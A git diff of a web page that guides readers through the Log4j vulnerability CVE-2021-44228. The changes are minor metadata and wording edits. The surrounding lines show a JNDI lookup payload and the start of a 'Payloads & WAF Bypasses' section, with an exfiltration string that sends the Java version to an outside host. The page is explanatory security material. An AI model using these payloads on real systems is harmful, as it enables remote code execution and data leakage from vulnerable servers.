@@ -22,7 +22,6 @@
     <meta property="og:image:alt" content="CVE-2021-44228" />
 
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:site" content="@skypatil98" />
     <meta name="twitter:creator" content="@skypatil98" />
     <meta property="og:url" content="https://akashpatil.me/log4j-guide-book.html" />
     <meta property="og:title" content="CVE-2021-44228 - Log4J Start to End Guide Book - akashpatil.me" />
@@ -219,7 +218,7 @@
                     
                    <h2>2.<u>How it works ( Detection )</u></h2>
                      <p> 
-1. An attacker inserts the JNDI lookup/payload in a anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br><br>
+1. An attacker inserts the JNDI lookup/payload anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br><br>
 2. The payload is passed to log4j for logging.<br><br>
 3. Log4j interpolates the string and queries the malicious ldap server.<br><br>
 4. The ldap server responds with directory information that contains the malicious java class.<br><br>
@@ -254,6 +253,7 @@
                   (adsbygoogle = window.adsbygoogle || []).push({});
                    </script>
                     </div><br />     
+                    
 <h2><u>Payloads & WAF Bypasses</u></h2>
 <pre><code>Want to know the Java version running on the target?<br>
 ${jndi:ldap://${sys:java.version}.collaborator.com}
